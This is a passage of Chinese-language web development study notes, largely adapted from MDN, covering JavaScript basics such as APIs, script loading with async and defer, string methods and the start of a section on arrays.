href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/grid.html">查看源代码</a>。</p><p>在你的浏览器里打开这个示例，让屏幕变宽变窄，看一看列轨数目的变化。这个方法里面的好事是，网格不是靠视口宽度判断的，而是可以容纳组件的宽度。对媒体查询这章节的建议就是，你可能根本不需要它！但是，实践中你会发现，由媒体查询改进的现代布局方式的恰当使用，将会产生最佳效果。</p><h2 id="3-javascript"><a href="#3-javascript" class="headerlink" title="3 javascript"></a>3 javascript</h2><blockquote><ol><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript">https://developer.mozilla.org/en-US/docs/Web/JavaScript</a></li></ol></blockquote><h3 id="3-1-javascript第一步"><a href="#3-1-javascript第一步" class="headerlink" title="3.1 javascript第一步"></a>3.1 javascript第一步</h3><p>JavaScript 是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新，交互式的地图，2D&#x2F;3D 动画，滚动播放的视频等等。JavaScript 怎能缺席。它是标准 Web 技术蛋糕的第三层，其中 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML">HTML</a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS">CSS</a> 我们已经在学习中心的其他部分进行了详细的讲解。</p><p>示例：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> para = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;p&#x27;</span>);<br><br>para.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, updateName);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> name = <span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;输入一个新的名字：&#x27;</span>);<br>  para.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;玩家 1：&#x27;</span> + name;<br>&#125;<br></code></pre></td></tr></table></figure><p>JavaScript 语言核心之上所构建的功能更令人兴奋。<strong>应用程序接口（Application Programming Interfaces</strong>（<strong>API</strong>））将为你的代码提供额外的超能力。</p><p>API 通常分为两类。</p><p><strong>浏览器 API</strong> 内建于 web 浏览器中，它们可以将数据从周边计算机环境中筛选出来，还可以做实用的复杂工作。例如：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model"><code>文档对象模型 API（DOM（Document Object Model）API）</code></a> 能通过创建、移除和修改 HTML，为页面动态应用新样式等手段来操作 HTML 和 CSS。比如当某个页面出现了一个弹窗，或者显示了一些新内容（像上文小 demo 中看到那样），这就是 DOM 在运行。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Geolocation"><code>地理位置 API（Geolocation API）</code></a> 获取地理信息。这就是为什么 <a href="https://www.google.cn/maps">谷歌地图</a> 可以找到你的位置，而且标示在地图上。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API"><code>画布（Canvas）</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebGL_API"><code>WebGL</code></a> API 可以创建生动的 2D 和 3D 图像。人们正运用这些 web 技术制作令人惊叹的作品。参见 <a href="https://www.chromeexperiments.com/webgl">Chrome Experiments</a> 以及 <a href="https://webglsamples.org/">webglsamples</a>。</li><li>诸如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLMediaElement"><code>HTMLMediaElement</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API"><code>WebRTC</code></a> 等 <a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/Audio_and_video_delivery">影音类 API</a> 让你可以利用多媒体做一些非常有趣的事，比如在网页中直接播放音乐和影片，或用自己的网络摄像头获取录像，然后在其他人的电脑上展示（试用简易版 <a href="http://chrisdavidmills.github.io/snapshot/">截图 demo</a> 以理解这个概念）。</li></ul><p><strong>第三方 API</strong> 并没有默认嵌入浏览器中，一般要从网上取得它们的代码和信息。比如：</p><ul><li><a href="https://dev.twitter.com/overview/documentation">Twitter API</a>、<a href="https://open.weibo.com/">新浪微博 API</a> 可以在网站上展示最新推文之类。</li><li><a href="https://developers.google.com/maps/">谷歌地图 API</a>、<a href="https://lbs.amap.com/">高德地图 API</a> 可以在网站嵌入定制的地图等等。</li></ul><h4 id="JavaScript-在页面上做了什么？"><a href="#JavaScript-在页面上做了什么？" class="headerlink" title="JavaScript 在页面上做了什么？"></a>JavaScript 在页面上做了什么？</h4><p>让我们简单回顾一下，浏览器在读取一个网页时都发生什么（<a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/First_steps/How_CSS_works#how_does_css_actually_work">CSS 如何工作</a> 一文中首次谈及）。浏览器在读取一个网页时，代码（HTML, CSS 和 JavaScript）将在一个运行环境（浏览器标签页）中得到执行。就像一间工厂，将原材料（代码）加工为一件产品（网页）。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/First_steps/What_is_JavaScript/execution.png" alt="img"></p><p>在 HTML 和 CSS 集合组装成一个网页后，浏览器的 JavaScript 引擎将执行 JavaScript 代码。这保证了当 JavaScript 开始运行之前，网页的结构和样式已经就位。</p><p>这样很好，因为 JavaScript 最普遍的用处是通过 DOM API（见上文）动态修改 HTML 和 CSS 来更新用户界面（user interface）。如果 JavaScript 在 HTML 和 CSS 就位之前加载运行，就会引发错误。</p><h4 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h4><p>每个浏览器标签页就是其自身用来运行代码的独立容器（这些容器用专业术语称为“运行环境”）。大多数情况下，每个标签页中的代码完全独立运行，而且一个标签页中的代码不能直接影响另一个标签页（或者另一个网站）中的代码。这是一个好的安全措施，如果不这样，黑客就可以从其他网站盗取信息，等等。</p><h4 id="JavaScript-运行次序"><a href="#JavaScript-运行次序" class="headerlink" title="JavaScript 运行次序"></a>JavaScript 运行次序</h4><p>当浏览器执行到一段 JavaScript 代码时，通常会按从上往下的顺序执行这段代码。这意味着你需要注意代码书写的顺序。比如，我们回到第一个例子中的 JavaScript 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> para = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;p&#x27;</span>);<br><br>para.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, updateName);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> name = <span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;输入一个新的名字：&#x27;</span>);<br>  para.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;玩家 1：&#x27;</span> + name;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们选定一个文本段落（第 1 行)，然后给它附上一个事件监听器（第 3 行），使得在它被点击时，<code>updateName()</code> 代码块（code block） （5 – 8 行）便会运行。<code>updateName()</code> （这类可以重复使用的代码块称为“函数”）向用户请求一个新名字，然后把这个名字插入到段落中以更新显示。</p><p>如果你互换了代码里最初两行的顺序，会导致问题。浏览器<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/First_steps/zh-CN/docs/Learn/Discover_browser_developer_tools">开发者控制台</a>将返回一个错误： <code>TypeError: para is undefined</code>。这意味着 <code>para</code> 对象还不存在，所以我们不能为它增添一个事件监听器。</p><h4 id="解释代码-vs-编译代码"><a href="#解释代码-vs-编译代码" class="headerlink" title="解释代码 vs 编译代码"></a>解释代码 vs 编译代码</h4><p>作为程序员，你或许听说过这两个术语：<strong>解释</strong>（interpret）和 <strong>编译</strong>（compile）。在解释型语言中，代码自上而下运行，且实时返回运行结果。代码在由浏览器执行前，不需要将其转化为其他形式。代码将直接以文本格式（text form）被接收和处理。</p><p>相对的，编译型语言需要先将代码转化（编译）成另一种形式才能运行。比如 C&#x2F;C++ 先被编译成汇编语言，然后才能由计算机运行。程序将以二进制的格式运行，这些二进制内容是由程序源代码产生的。</p><p>JavaScript 是轻量级解释型语言。浏览器接受到 JavaScript 代码，并以代码自身的文本格式运行它。技术上，几乎所有 JavaScript 转换器都运用了一种叫做即时编译（just-in-time compiling）的技术；当 JavaScript 源代码被执行时，它会被编译成二进制的格式，使代码运行速度更快。尽管如此，JavaScript 仍然是一门解释型语言，因为编译过程发生在代码运行中，而非之前。</p><p>两种类型的语言各有优势，这个问题我们暂且不谈。</p><h4 id="服务器端代码-vs-客户端代码"><a href="#服务器端代码-vs-客户端代码" class="headerlink" title="服务器端代码 vs 客户端代码"></a>服务器端代码 vs 客户端代码</h4><p>你或许还听说过<strong>服务器端（server-side）</strong>和 **客户端（client-side）**代码这两个术语，尤其是在 web 开发时。客户端代码是在用户的电脑上运行的代码，在浏览一个网页时，它的客户端代码就会被下载，然后由浏览器来运行并展示。这就是**客户端 JavaScript**。</p><p>而服务器端代码在服务器上运行，接着运行结果才由浏览器下载并展示出来。流行的服务器端 web 语言包括：PHP、Python、Ruby、ASP.NET 以及…… JavaScript！JavaScript 也可用作服务器端语言，比如现在流行的 Node.js 环境，你可以在我们的 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side">动态网页 - 服务器端编程</a> 主题中找到更多关于服务器端 JavaScript 的知识。</p><h4 id="动态代码-vs-静态代码"><a href="#动态代码-vs-静态代码" class="headerlink" title="动态代码 vs 静态代码"></a>动态代码 vs 静态代码</h4><p>“<strong>动态</strong>”一词既适用于客户端 JavaScript，又适用于描述服务器端语言。是指通过按需生成新内容来更新 web 页面 &#x2F; 应用，使得不同环境下显示不同内容。服务器端代码会在服务器上动态生成新内容，例如从数据库中提取信息。而客户端 JavaScript 则在用户端浏览器中动态生成新内容，比如说创建一个新的 HTML 表格，用从服务器请求到的数据填充，然后在网页中向用户展示这个表格。两种情况的意义略有不同，但又有所关联，且两者（服务器端和客户端）经常协同作战。</p><p>没有动态更新内容的网页叫做“<strong>静态</strong>”页面<strong>，</strong>所显示的内容不会改变。</p><h4 id="内联-JavaScript-处理器"><a href="#内联-JavaScript-处理器" class="headerlink" title="内联 JavaScript 处理器"></a>内联 JavaScript 处理器</h4><p>注意，有时候你会遇到在 HTML 中存在着一丝真实的 JavaScript 代码。它或许看上去像这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createParagraph</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> para = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;p&#x27;</span>);<br>  para.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;你点击了这个按钮！&#x27;</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(para);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">button</span> <span class="hljs-keyword">onclick</span>=<span class="hljs-string">&quot;createParagraph()&quot;</span>&gt;点我呀&lt;/<span class="hljs-keyword">button</span>&gt;<br></code></pre></td></tr></table></figure><p>你可以在下面尝试这个版本的 demo。</p><iframe class="sample-code-frame" title="内联 JavaScript 处理器 sample" id="frame_内联_javascript_处理器" width="100%" height="150" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/First_steps/What_is_JavaScript/_sample_.%E5%86%85%E8%81%94_javascript_%E5%A4%84%E7%90%86%E5%99%A8.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>这个 demo 与之前的两个功能完全一致，只是在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/button"><code>&lt;button&gt;</code></a> 元素中包含了一个内联的 <code>onclick</code> 处理器，使得函数在按钮被按下时运行。</p><p><strong>然而请不要这样做。</strong> 这将使 JavaScript 污染到 HTML，而且效率低下。对于每个需要应用 JavaScript 的按钮，你都得手动添加 <code>onclick=&quot;createParagraph()&quot;</code> 属性。</p><p>可以使用纯 JavaScript 结构来通过一个指令选取所有按钮。下文的这段代码即实现了这一目的：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">const buttons = document.query<span class="hljs-constructor">SelectorAll(&#x27;<span class="hljs-params">button</span>&#x27;)</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; buttons.length ; i++) &#123;<br>  buttons<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">createParagraph</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样写乍看去比 <code>onclick</code> 属性要长一些，但是这样写会对页面上所有按钮生效，无论多少个，或添加或删除，完全无需修改 JavaScript 代码。</p><h4 id="脚本调用策略"><a href="#脚本调用策略" class="headerlink" title="脚本调用策略"></a>脚本调用策略</h4><p>要让脚本调用的时机符合预期，需要解决一系列的问题。这里看似简单，实际大有文章。最常见的问题就是：HTML 元素是按其在页面中出现的次序调用的，如果用 JavaScript 来管理页面上的元素（更精确的说法是使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model">文档对象模型</a> DOM），若 JavaScript 加载于欲操作的 HTML 元素之前，则代码将出错。</p><p>在上文的“内部”、“外部”示例中，JavaScript 调用于文档头处，解析 HTML 文档体之前。这样做是有隐患的，需要使用一些结构来避免错误发生。</p><p>“内部”示例使用了以下结构：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;DOMContentLoaded&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  . . .<br>&#125;);<br></code></pre></td></tr></table></figure><p>这是一个事件监听器，它监听浏览器的 “<code>DOMContentLoaded</code>“ 事件，即 HTML 文档体加载、解释完毕事件。事件触发时将调用 “ <code>. . .</code>“ 处的代码，从而避免了错误发生（<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Building_blocks/Events">事件</a> 的概念稍后学习）。</p><p>“外部”示例中使用了 JavaScript 的一项现代技术（<code>async</code> “异步”属性）来解决这一问题，它告知浏览器在遇到 <code>&lt;script&gt;</code> 元素时不要中断后续 HTML 内容的加载。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上述情况下，脚本和 HTML 将一并加载，代码将顺利运行。</p><p><strong>备注：</strong> “外部”示例中 <code>async</code> 属性可以解决调用顺序问题，因此无需使用 <code>DOMContentLoaded</code> 事件。而 <code>async</code> 只能用于外部脚本，因此不适用于“内部”示例。</p><p>解决此问题的旧方法是：把脚本元素放在文档体的底端（<code>&lt;/body&gt;</code> 标签之前，与之相邻），这样脚本就可以在 HTML 解析完毕后加载了。此方案（以及上述的 <code>DOMContentLoaded</code> 方案）的问题是：只有在所有 HTML DOM 加载完成后才开始脚本的加载&#x2F;解析过程。对于有大量 JavaScript 代码的大型网站，可能会带来显著的性能损耗。这也是 <code>async</code> 属性诞生的初衷。</p><h4 id="async-和-defer"><a href="#async-和-defer" class="headerlink" title="async 和 defer"></a><code>async</code> 和 <code>defer</code></h4><p>上述的脚本阻塞问题实际有两种解决方案 —— <code>async</code> 和 <code>defer</code>。我们来依次讲解。</p><p>浏览器遇到 <code>async</code> 脚本时不会阻塞页面渲染，而是直接下载然后运行。这样脚本的运行次序就无法控制，只是脚本不会阻止剩余页面的显示。当页面的脚本之间彼此独立，且不依赖于本页面的其它任何脚本时，<code>async</code> 是最理想的选择。</p><p>比如，如果你的页面要加载以下三个脚本：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">async</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">async</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/script2.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">async</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/script3.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>三者的调用顺序是不确定的。<code>jquery.js</code> 可能在 <code>script2</code> 和 <code>script3</code> 之前或之后调用，如果这样，后两个脚本中依赖 <code>jquery</code> 的函数将产生错误，因为脚本运行时 <code>jquery</code> 尚未加载。</p><p>解决这一问题可使用 <code>defer</code> 属性，脚本将按照在页面中出现的顺序加载和运行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">defer</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">defer</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/script2.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">defer</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/script3.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>添加 <code>defer</code> 属性的脚本将按照在页面中出现的顺序加载，因此第二个示例可确保 <code>jquery.js</code> 必定加载于 <code>script2.js</code> 和 <code>script3.js</code> 之前，同时 <code>script2.js</code> 必定加载于 <code>script3.js</code> 之前。</p><p>脚本调用策略小结：</p><ul><li>如果脚本无需等待页面解析，且无依赖独立运行，那么应使用 <code>async</code>。</li><li>如果脚本需要等待页面解析，且依赖于其它脚本，调用这些脚本时应使用 <code>defer</code>，将关联的脚本按所需顺序置于 HTML 中。</li></ul><h3 id="3-2-有趣的字符串方法"><a href="#3-2-有趣的字符串方法" class="headerlink" title="3.2 有趣的字符串方法"></a>3.2 有趣的字符串方法</h3><p>现在我们学习基本的字符串语法，让我们开始思考一下我们可以对内置方法的字符串做什么有用的操作，例如查找文本字符串的长度，加入和分割字符串，将字符串中的一个字符替换为另一个字符。</p><h4 id="获得字符串的长度"><a href="#获得字符串的长度" class="headerlink" title="获得字符串的长度"></a>获得字符串的长度</h4><p>这很简单 — 你可以很轻松的使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/length"><code>length</code></a> 属性。尝试输入以下的两行代码：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">let browserType = <span class="hljs-string">&#x27;mozilla&#x27;</span>;<br>browserType.<span class="hljs-built_in">length</span>;<br></code></pre></td></tr></table></figure><p>这个结果应该返回一个数字：7，因为”mozilla”的长度为 7 个字符。说字符串的长度有用是有很多原因的，例如，你可能想算出一连串名字的长度，并用名字长度来作为名字排序的依据，亦或让一个用户知道他输入的用户名太长，已经超出了输入的字符串长度限制。</p><h4 id="检索特定字符串字符"><a href="#检索特定字符串字符" class="headerlink" title="检索特定字符串字符"></a>检索特定字符串字符</h4><p>在相关的注释中，您可以使用方括号表示法返回字符串中的任何字符 - 这意味着您可以在变量名的末尾包含方括号（[ ]）。在方括号内，您可以包含要返回的字符的编号，例如，您要检索第一个字母，可以这样做：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">browserType[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>电脑从 0 开始，不是 1！要检索任何字符串的最后一个字符，我们可以使用下面这行，将这种技术与我们上面看到的 length 属性相结合起来：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">browserType[browserType.length-<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>“mozilla”的长度为 7，但由于计数从 0 开始，所以字符位置为 6，因此需要长度为<strong>length-1</strong>。例如，您可以使用它来查找一系列字符串的第一个字母，并按字母顺序排列。</p><h4 id="在字符串中查找子字符串并提取它"><a href="#在字符串中查找子字符串并提取它" class="headerlink" title="在字符串中查找子字符串并提取它"></a>在字符串中查找子字符串并提取它</h4><ol><li><p>有时候你会想要找出一个较小的字符串是否存在于一个较大的字符串中（我们通常会说一个字符串中存在一个子字符串）。这可以使用<code>indexOf()</code>方法来完成，该方法需要一个parameter (en-US)— 你想要搜索的子字符串。尝试以下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">browserType.<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&#x27;zilla&#x27;</span>);<br></code></pre></td></tr></table></figure><p>结果是 2，因为子字符串“zilla”从“mozilla”内的位置 2（0，1，2 —— 所以从第 3 个字符）开始。这样的代码可以用来过滤字符串。例如，假设我们有一个 Web 地址列表，但我们只想打印出包含“mozilla”的那些地址。</p></li><li><p>这可以用另一种可能更有效的方式来实现。尝试以下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">browserType.<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&#x27;vanilla&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这应该会得到-1的结果 —— 当在主字符串中找不到子字符串（在本例中为“vanilla”）时将返回-1。 您可以使用它来查找不包含子串“mozilla”的所有字符串实例，或者如果使用否定运算符，请执行以下操作。你可以这样做：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(browserType.indexOf(<span class="hljs-string">&#x27;mozilla&#x27;</span>)</span></span> !== -<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-comment">// do stuff with the string</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>当你知道字符串中的子字符串开始的位置，以及想要结束的字符时，<code>slice()</code>可以用来提取它。尝试以下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">browserType</span>.slice(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>这时返回”moz”——第一个参数是开始提取的字符位置，第二个参数是提取的最后一个字符的后一个位置。所以提取从第一个位置开始，直到但不包括最后一个位置。（此例中）你也可以说第二个参数等于被返回的字符串的长度。</p></li><li><p>此外，如果您知道要在某个字符之后提取字符串中的所有剩余字符，则不必包含第二个参数，而只需要包含要从中提取的字符位置 字符串中的其余字符。尝试以下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">browserType.slice(<span class="hljs-number">2</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这返回“zilla” —— 这是因为 2 的字符位置是字母 z，并且因为没有包含第二个参数，所以返回的子字符串是字符串中的所有剩余字符。</p></li></ol><p><strong>备注：</strong> <code>slice()</code>的第二个参数是可选的：如果没有传入这个参数，分片结束位置会在原始字符串的末尾。这个方法也有其他的选项；学习<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/slice"><code>slice()</code></a>这页，来看看你还能发现什么其他作用。</p><h4 id="转换大小写"><a href="#转换大小写" class="headerlink" title="转换大小写"></a>转换大小写</h4><p>字符串方法<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/toLowerCase"><code>toLowerCase()</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/toUpperCase"><code>toUpperCase()</code></a>字符串并将所有字符分别转换为小写或大写。例如，如果要在将数据存储在数据库中之前对所有用户输入的数据进行规范化，这可能非常有用。</p><p>让我们尝试输入以下几行来看看会发生什么：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">let</span> radData = &#x27;My NaMe Is MuD&#x27;;<br>radData.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>;<br>radData.<span class="hljs-keyword">to</span><span class="hljs-constructor">UpperCase()</span>;<br></code></pre></td></tr></table></figure><h4 id="替换字符串的某部分"><a href="#替换字符串的某部分" class="headerlink" title="替换字符串的某部分"></a>替换字符串的某部分</h4><p>您可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace"><code>replace()</code></a>方法将字符串中的一个子字符串替换为另一个子字符串。在基础的层面上，这个工作非常简单。你当然可以用它做一些更高级的事情，但目前我们不会涉及到。</p><p>它需要两个参数 - 要被替换下的字符串和要被替换上的字符串。尝试这个例子：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">browserType.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;moz&#x27;</span>,<span class="hljs-string">&#x27;van&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注意，在实际程序中，想要真正更新 <code>browserType</code> 变量的值，您需要设置变量的值等于刚才的操作结果；它不会自动更新子串的值。所以事实上你需要这样写：<code>browserType = browserType.replace(&#39;moz&#39;,&#39;van&#39;);</code>。</p><h3 id="3-3-数组"><a href="#3-3-数组" class="headerlink" title="3.3 数组"></a>3.3 数组</h3><p>数组通常被描述为“像列表一样的对象”; 简单来说，数组是一个包含了多个值的对象。数组对象可以存储在变量中，并且能用和其他任何类型的值完全相同的方式处理，区别在于我们可以单独访问列表中的每个值，并使用列表执行一些有用和高效的操作，如循环 - 它对数组中的每个元素都执行相同的操作。</p><h4 id="数组是什么？"><a href="#数组是什么？" class="headerlink" title="数组是什么？"></a>数组是什么？</h4><p>数组通常被描述为“像列表一样的对象”; 简单来说，数组是一个包含了多个值的对象。数组对象可以存储在变量中，并且能用和其他任何类型的值完全相同的方式处理，区别在于我们可以单独访问列表中的每个值，并使用列表执行一些有用和高效的操作，如循环 - 它对数组中的每个元素都执行相同的操作。也许我们有一系列产品和价格存储在一个数组中，我们想循环遍历所有这些产品，并将它们打印在发票上，同时将所有产品的价格统计在一起，然后将总价格打印在底部。</p><p>如果我们没有数组，我们必须将每个产品存储在一个单独的变量中，然后调用打印的代码，并为每个产品单独添加。花费的时间要长得多，效率很低，而且也容易出错。如果我们有 10 个产品需要添加发票，那就只是有点麻烦而已，但是 100 个，或者 1000 个呢？我们稍后将在文章中使用这个例子。</p><p>像以前的文章一样，我们通过在 JavaScript 控制台中输入一些示例来了解数组的基础知识。我们在下面提供了一个（您也可以在单独的选项卡或窗口中打开此控制台，或者如果您愿意，请使用<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Common_questions/Tools_and_setup/What_are_browser_developer_tools">浏览器的开发者工具控制台</a>）。</p><h4 id="创建数组"><a href="#创建数组" class="headerlink" 